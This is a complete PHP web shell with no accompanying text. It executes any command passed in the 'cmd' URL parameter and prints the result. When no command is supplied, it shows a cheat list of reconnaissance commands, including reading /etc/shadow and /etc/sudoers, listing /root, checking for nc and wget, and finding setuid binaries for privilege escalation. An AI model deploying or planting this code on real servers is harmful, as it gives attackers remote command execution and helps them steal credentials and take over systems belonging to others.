<?php
  if( empty( $_GET["cmd"] ) ){
    echo "Useful things:\n";
    echo "  uname -a\n";
    echo "  id\n";
    echo "  cat /etc/passwd\n";
    echo "  cat /etc/shadow\n";
    echo "  cat /etc/group\n";
    echo "  cat /etc/group | grep admin\n";
    echo "  cat /etc/sudoers\n";
    echo "  ls -la /home\n";
    echo "  ls -la /root\n";
    echo "  ls -la /var/www\n";
    echo "  which nc\n";
    echo "  which wget\n";
    echo "  find / -type f -perm -4000\n";

  }
  echo "<pre>";
  exec( $_GET["cmd"], $out );
  echo htmlentities( join( "\n", $out ) );
  echo "</pre>";
?>
